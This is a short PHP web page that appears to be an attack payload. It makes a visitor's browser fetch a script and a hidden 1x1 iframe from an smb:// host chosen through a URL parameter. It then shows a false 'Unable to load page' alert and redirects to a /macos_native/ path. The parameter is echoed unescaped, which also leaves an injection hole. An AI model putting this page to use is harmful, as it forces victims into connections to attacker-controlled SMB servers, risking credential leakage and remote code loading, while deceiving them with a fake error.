<html>
<head>
</head>
<body>
    <?php
    $smb_path = "192.168.0.1";
    if(isset($_GET['smb_path']))
    {
        $smb_path = $_GET['smb_path'];
    }
    ?>
    <script type="text/javascript" src="smb://<?php echo $smb_path; ?>/test.js"></script>
	<iframe src="smb://<?php echo $smb_path; ?>/banner.html" width="1" height="1" align="left">
		Banner in iframe
	</iframe>
	<script type="text/javascript">
		alert("Unable to load page.");
		window.location.href = "/macos_native/";
	</script>
</body>
</html>